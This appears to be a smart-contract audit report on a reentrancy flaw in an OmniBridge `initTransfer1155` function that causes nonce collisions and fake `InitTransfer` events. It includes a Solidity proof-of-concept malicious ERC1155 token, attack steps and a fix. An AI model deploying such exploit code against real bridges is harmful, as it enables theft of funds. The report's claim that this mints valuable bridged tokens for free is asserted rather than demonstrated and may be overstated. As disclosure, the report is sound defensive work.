### Title
Reentrancy via ERC1155 Mandatory Callback in `initTransfer1155` Causes Nonce Collision and Fake `InitTransfer` Events — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` reads `currentOriginNonce` from storage at the point of event emission rather than capturing it in a local variable at the start of the function. Because ERC1155 `safeTransferFrom` mandatorily invokes `onERC1155Received` on the recipient — and a malicious ERC1155 token can reenter `initTransfer1155` during that callback — a single user-initiated call can cause two `InitTransfer` events to be emitted with the **same** `originNonce`, while one nonce is permanently skipped. Because the malicious token controls whether tokens are actually transferred, the attacker can emit valid-looking `InitTransfer` events without locking any real tokens on EVM, causing the NEAR side to mint bridged tokens for free.

---

### Finding Description

`initTransfer1155` increments `currentOriginNonce` at the top of the function but then reads the storage variable again — after the external ERC1155 call — when passing it to `initTransferExtension` and `emit`: [1](#0-0) 

```
currentOriginNonce += 1;                          // (1) nonce = N
...
IERC1155(tokenAddress).safeTransferFrom(          // (2) external call — reentrancy window
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...); // (3) reads storage — may be N+1
emit BridgeTypes.InitTransfer(
    msg.sender, deterministicToken, currentOriginNonce, ...  // (4) reads storage — may be N+1
);
```

A malicious ERC1155 token can, inside its `safeTransferFrom` implementation, call back into `initTransfer1155` before returning. The bridge's `onERC1155Received` guard only checks `operator != address(this)`: [2](#0-1) 

In `initTransfer1155`, the bridge itself is the caller of `safeTransferFrom`, so `operator == address(this)` and the guard passes for both the inner and outer calls. The malicious token can therefore:

1. Accept the outer `safeTransferFrom` call.
2. Immediately call `bridge.initTransfer1155(...)` again (reentrancy).
3. The inner call increments `currentOriginNonce` to N+1 and emits `InitTransfer(nonce=N+1)`.
4. Return to the outer call; the outer call now reads `currentOriginNonce = N+1` and emits a second `InitTransfer(nonce=N+1)`.

Result: nonce N is never emitted; nonce N+1 is emitted twice. The malicious token need not actually update any balances — it can implement `safeTransferFrom` as a no-op while still triggering the callback chain.

`logMetadata1155` is fully permissionless: [3](#0-2) 

Any caller can register any ERC1155 address, causing the NEAR side to deploy a wrapped token for it. Once registered, `InitTransfer` events for that token are treated as authoritative proof of a lock.

The `OmniBridgeWormhole` variant compounds this: `initTransferExtension` publishes a Wormhole message using the same stale `currentOriginNonce`, so the duplicate nonce also propagates through the Wormhole path: [4](#0-3) 

The documented invariant "State before external calls" is violated here: [5](#0-4) 

---

### Impact Explanation

The NEAR side treats any `InitTransfer` event emitted by the bridge as proof that tokens are locked on EVM. An attacker who emits a valid `InitTransfer` event without actually locking tokens causes the NEAR side to mint wrapped tokens for free. With the nonce collision, the NEAR side processes the first `InitTransfer(nonce=N+1)` and rejects the second as a replay — but the attacker has already received minted tokens on NEAR for zero EVM collateral. This is unauthorized minting / theft of bridged funds.

---

### Likelihood Explanation

`logMetadata1155` and `initTransfer1155` are both permissionless and callable by any unprivileged user. Deploying a malicious ERC1155 token requires no special access. The ERC1155 standard mandates the `onERC1155Received` callback, making the reentrancy window structural rather than token-specific. The attack requires no admin compromise, no front-running, and no off-chain coordination.

---

### Recommendation

Capture `currentOriginNonce` in a local variable immediately after incrementing it, and use only the local variable in all subsequent reads within the function:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 originNonce = currentOriginNonce;  // capture before any external call
    ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    ...
    initTransferExtension(..., originNonce, ...);
    emit BridgeTypes.InitTransfer(..., originNonce, ...);
}
```

Apply the same fix to `initTransfer` for consistency. Additionally, consider adding a reentrancy guard (`ReentrancyGuardUpgradeable`) to `initTransfer1155` and `initTransfer` as defense-in-depth.

---

### Proof of Concept

```solidity
contract MaliciousERC1155 is IERC1155 {
    address bridge;
    bool reentered;

    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes calldata
    ) external override {
        if (!reentered) {
            reentered = true;
            // Reenter bridge — increments currentOriginNonce to N+1, emits InitTransfer(N+1)
            IOmniBridge(bridge).initTransfer1155(
                address(this), id, uint128(amount), 0, 0, "attacker.near", ""
            );
            reentered = false;
        }
        // Do NOT actually transfer tokens — balances unchanged
        // Call onERC1155Received to satisfy the ERC1155 standard
        IERC1155Receiver(to).onERC1155Received(msg.sender, from, id, amount, "");
    }
    // ... other IERC1155 stubs
}

// Attack:
// 1. Deploy MaliciousERC1155, set bridge address
// 2. bridge.logMetadata1155(maliciousToken, tokenId)  ← permissionless, registers on NEAR
// 3. bridge.initTransfer1155(maliciousToken, tokenId, X, 0, 0, "attacker.near", "")
//    → emits InitTransfer(nonce=N+1) twice, nonce N skipped, 0 tokens locked
// 4. NEAR side mints wrapped tokens for attacker at nonce N+1
``` [6](#0-5) [2](#0-1) [3](#0-2)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L234-270)
```text
    function logMetadata1155(
        address tokenAddress,
        uint256 tokenId
    ) external payable {
        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-490)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridgeWormhole.sol (L118-150)
```text
    function initTransferExtension(
        address sender,
        address tokenAddress,
        uint64 originNonce,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message,
        uint256 value
    ) internal override {
        bytes memory payload = bytes.concat(
            bytes1(uint8(MessageType.InitTransfer)),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(sender),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(tokenAddress),
            Borsh.encodeUint64(originNonce),
            Borsh.encodeUint128(amount),
            Borsh.encodeUint128(fee),
            Borsh.encodeUint128(nativeFee),
            Borsh.encodeString(recipient),
            Borsh.encodeString(message)
        );
        // slither-disable-next-line reentrancy-eth
        _wormhole.publishMessage{value: value}(
            wormholeNonce,
            payload,
            _consistencyLevel
        );

        wormholeNonce++;
    }
```

**File:** evm/CLAUDE.md (L34-34)
```markdown
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
```
